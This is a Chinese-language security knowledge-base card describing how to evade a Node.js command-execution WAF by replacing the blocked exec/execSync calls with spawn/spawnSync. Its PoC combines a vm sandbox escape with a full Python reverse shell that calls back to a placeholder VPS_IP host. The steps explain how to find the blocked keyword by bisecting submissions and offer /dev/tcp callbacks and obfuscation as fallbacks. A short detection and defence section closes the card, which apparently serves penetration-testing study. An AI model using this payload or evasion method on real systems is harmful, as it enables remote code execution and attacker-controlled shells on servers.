---
id: web-nodejs-child-process-exec-keyword-waf-spawn-bypass
title: Node.js 命令执行 WAF 绕过：exec/execSync 关键字被禁时改用 spawn/spawnSync 等价 API 执行同一命令
type: scenario
domain: web
path: web/nodejs
technique: child-process-api-substitution-waf-bypass
tags:
- nodejs
- waf-bypass
- command-injection
- child-process
- spawn
- blacklist
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-V352
  verified_at: '2026-11-09T00:39:36+08:00'
  notes: 已对照原文与图02核对：Node.js v16.8.0 文档中 exec/execSync 接收整条命令字符串、spawn/spawnSync 接收 command+args 数组，卡片语法差异与参数拆分说明准确；原文二分法定位 exec() 被拦、换 spawn 因参数形式未拆无回连、最终 spawnSync('python',['-c',...]) 成功，均与正文一致。通用技巧无原文版本区间，未设 affected_versions 合理。与候选 binary-pwn-sandbox-escape-nodejs-vm-waf-reflect-ownkeys-bypass（正则同时封 spawn 的拼接绕过）及 SSTI/EJS 卡（spawnSync 仅作最终 payload）非同链，不重复。PoC 未执行；frontmatter 无 sources/source_url；dup-scan(19:10)早于本批建卡无涉及 pair。
url: /docs/web/nodejs/web-nodejs-child-process-exec-keyword-waf-spawn-bypass/
draft: false
kb_aliases:
- exec 被拦换 spawn
- child_process API 等价替换
- spawnSync 绕过 WAF
- Node.js 命令执行关键字绕过
- 二分法定位 WAF 拦截关键字
---

## 一句话结论

当 WAF 或黑名单只拦截 `exec(`/`execSync` 等字面量时，Node.js `child_process` 还提供 `spawn`/`spawnSync`/`execFile`/`execFileSync`/`fork` 等等价命令执行 API：把命令与参数改成数组形式调用未列入黑名单的 API，即可在不出现被禁关键字的情况下执行同样的系统命令；在 YApi mock 脚本场景中，`spawnSync('python', ['-c', '...'])` 成功绕过了针对 `exec()` 的 WAF 并拿到反弹 shell。

## 原理

- **黑名单只看函数名，不理解 API 等价性**：`exec`、`execSync`、`execFile`、`execFileSync`、`spawn`、`spawnSync`、`fork` 都属于 `child_process` 模块，最终都会创建子进程执行外部程序。WAF 若只针对常见 payload 中的 `exec()` 做关键字匹配，替换成 `spawn`/`spawnSync` 后同一意图的代码不再命中文档中的特征。
- **两个 API 族的语法差异**：
  - `exec(command[, options][, callback])` / `execSync(command[, options])` 接收一整条字符串交给 shell 解释，因此可以写管道、重定向和带空格的命令行。
  - `spawn(command[, args][, options])` / `spawnSync(command, args[, options])` 的**命令与参数分离**，默认不经过 shell。改写时必须把原命令行拆成程序名与参数数组；需要 shell 语法（管道、重定向、`;`、变量展开）时，显式调用解释器承载，如 `spawnSync('bash', ['-c', 'id; uname -a'])` 或 `spawnSync('python', ['-c', '<脚本>'])`。
  - 若只把 `execSync("命令串")` 机械改成 `spawnSync("命令串")` 而不拆参数，命令不会按预期运行；本文案例中第一次换 `spawn` 后反弹 shell 无回连，就是参数形式不符合新 API 所致。
- **定位被拦关键字**：先保存一段无害内容确认功能可用（排除“保存功能被禁用”），再把恶意脚本二分法分段保存，逐步缩小到被 WAF 拒绝的那一段，最终定位到具体函数名（案例中为 `exec()`）。这是纯黑盒的关键字 oracle。
- **为什么能成功**：WAF 规则覆盖面不足，未把 `child_process` 的完整 API 家族纳入；而 Node.js 运行时对所有 API 一视同仁。替换后保存成功，访问触发点即可执行。

## 触发条件

- 存在可写入并会被服务端执行的 JavaScript 脚本/表达式入口（如 YApi 接口 mock 脚本、其他 Node.js 应用的低代码脚本功能）。
- WAF/黑名单基于关键字匹配，且只覆盖 `exec`/`execSync` 等部分 API，未覆盖 `spawn`/`spawnSync` 或未做语法级检测。
- 目标环境存在可用于承载复杂命令的解释器（python/bash/sh）或可直接调用的程序；需要回连时目标可出网。
- 攻击者能反复提交脚本保存请求，用于二分定位被拦关键字。

## 利用步骤

1. 提交无害脚本确认保存/执行链路正常，排除功能被关闭；记录 WAF 拒绝时的响应差异。
2. 把恶意脚本按段二分提交（先提交前半段，再提交后半段……），用“保存成功/被拒”作为 oracle 缩小到被拦截的最小片段，确认关键字（如 `exec(`）。
3. 查阅 `child_process` 文档，选择不在黑名单中的等价 API（`spawn`/`spawnSync`/`execFile`/`execFileSync`）。
4. 按新 API 语法改写：命令与参数拆成数组；复杂命令改为 `bash -c`/`python -c` 承载。
5. 保存成功后访问/触发脚本执行点，用 `id`/`whoami` 验证；无回显时改用反向连接（python socket、bash `/dev/tcp`）验证。
6. 若新 API 也被拦，再考虑函数名/模块名字符串拼接或编码，但优先寻找未覆盖的等价 API 与调用形式。

## PoC

被 WAF 拦截的原始写法：

```javascript
const process = this.constructor.constructor('return process')()
mockJson = process.mainModule.require("child_process").execSync("whoami")
```

替换为未被拦截的等价 API（命令与参数分离；复杂逻辑交给 python）：

```javascript
const process = this.constructor.constructor('return process')()
const cp = process.mainModule.require("child_process")

// 简单命令：用 bash -c 承载 shell 语法
cp.spawnSync('bash', ['-c', 'id; uname -a'])

// 案例中的反向 shell：python -c 承载整段脚本
cp.spawnSync('python', ['-c',
  'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VPS_IP",6665));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
])
```

对照文档：`exec(command[, options][, callback])` 与 `execSync(command[, options])` 接收整条命令字符串；`spawn(command[, args][, options])` 与 `spawnSync(command, args[, options])` 接收程序名与参数数组。

## 变体与关联

- **变体（等价 API）**：`execFile`/`execFileSync` 接收 (file, args) 形式，同样可执行程序；`fork` 可执行 Node 模块；`child_process` 的每一个 API 都可作为替换候选。
- **变体（关键字混淆）**：若连 `spawn`/`child_process` 也被拦，可叠加字符串拼接、`String.fromCharCode`、拼接属性名等，参见字符串拼接类黑名单绕过手法；但优先 API 替换更稳定。
- **语义边界**：`spawn` 默认不经 shell，管道/重定向/通配符失效；需要时显式调用 `bash -c`。`execSync` 被禁但 `spawnSync` 可用时，注意 `spawnSync` 的返回值结构与 stdout 读取方式不同。
- 关联：[[web-nodejs-yapi-mock-script-vm-rce]]（本手法在 YApi mock 脚本链中的完整利用）、[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]（前置的 vm 逃逸原语）、[[web-nodejs-expression-blacklist-string-concat-process-env]]（同一思路下的字符串拼接关键字绕过）。
- 边界：WAF 若对 `child_process` 全 API 家族做匹配、或改为 AST 白名单/参数化接口、或直接关闭脚本功能，本替换手法失效。

## 检测与防御

- **WAF 规则**：覆盖 `child_process` 完整 API 家族（`exec`、`execSync`、`execFile`、`execFileSync`、`spawn`、`spawnSync`、`fork`）及 `require`/`import` 加载方式；不要只匹配 `exec()`。更彻底的是对脚本做 AST 白名单而非关键字黑名单。
- **运行时检测**：监控 Node 进程派生子进程的行为，尤其是 `bash -c`、`sh -c`、`python -c`、`nc` 等命令行与异常出站连接；对比脚本保存前后内容变化。
- **防御**：不需要脚本功能时关闭；需要时在独立进程/容器中执行并限制网络、文件系统与权限；Node 进程以非 root 运行。
- **响应**：发现被改写的脚本后回滚并审计提交者账号与来源 IP，检查主机侧子进程、外连与后续持久化痕迹。
